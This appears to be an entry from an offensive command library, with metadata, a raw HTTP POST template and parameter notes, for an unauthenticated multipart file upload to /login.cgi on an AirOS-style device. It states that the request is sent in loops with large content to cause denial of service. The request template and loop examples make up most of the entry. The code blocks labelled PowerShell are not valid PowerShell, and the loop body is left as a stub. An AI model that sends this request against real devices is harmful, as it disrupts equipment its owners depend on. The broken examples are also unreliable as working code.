---
data: >-
  POST http://$ip/login.cgi HTTP/1.1

  Proxy-Connection: keep-alive

  Content-Length: 5278

  Cache-Control: max-age=0

  Origin: http://$ip

  Upgrade-Insecure-Requests: 1

  User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML,
  like Gecko) Chrome/55.0.2883.87 Safari/537.36

  Content-Type: multipart/form-data;
  boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

  Referer: http://$ip/login.cgi

  Accept-Language: en-US,en;q=0.8

  Cookie: last_check=1485458998012;
  AIROS_SESSIONID=64e0483fab347136fb49fdf81e5542bc; ui_language=en_US

  Host: $ip


  ------WebKitFormBoundaryoA1KFlNlMcwhR9SP

  Content-Disposition: form-data; name="file"; filename="$i.txt"

  Content-Type: text/plain


  $content

  ------WebKitFormBoundaryoA1KFlNlMcwhR9SP

  Content-Disposition: form-data; name="action"


  upload

  ------WebKitFormBoundaryoA1KFlNlMcwhR9SP--
tags:
  - http-post
  - file-upload
type: command
executor: powershell
platforms:
  - Windows
id: 55277d4a-0ad8-415f-8058-45c91d778f83
created_at: '2025-12-14T05:32:10.005Z'
updated_at: '2025-12-14T05:32:10.005Z'
verified: false
validated: true
submitted: true
---
# Upload-File-via-HTTP-POST-to-login-cgi

## Command

```powershell
# Raw POST body as string for piping
POST http://$ip/login.cgi HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP

# Multipart body with file and action
```

## Description

Generates a raw HTTP POST request string for multipart/form-data upload to /login.cgi, used in loops for DoS. Simulates browser upload without auth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $ip | Target device IP address | Yes |
| $i | Filename counter for uniqueness (e.g., 1.txt) | Yes (in loops) |
| $content | File content (e.g., 'A' x 90000) | Yes |
| action | Form field set to 'upload' | Yes |

## Examples

### Basic Usage

```powershell
$ip = "192.168.1.1"
$content = "test content"
$i = 1
# Construct $POST string as above, then echo | Send-NetworkData
```

### Advanced Usage

```powershell
# In loop with large content
for ($i=1; $i -le 10; $i++) { # Build and send }
```

## Expected Output

HTTP response body from server, typically 200 OK with no error, indicating successful upload to /tmp/upload.

## Related

- [[commands/send-networkdata-tcp-function]]
- [[procedures/test-unauthenticated-file-upload-to-login-cgi]]
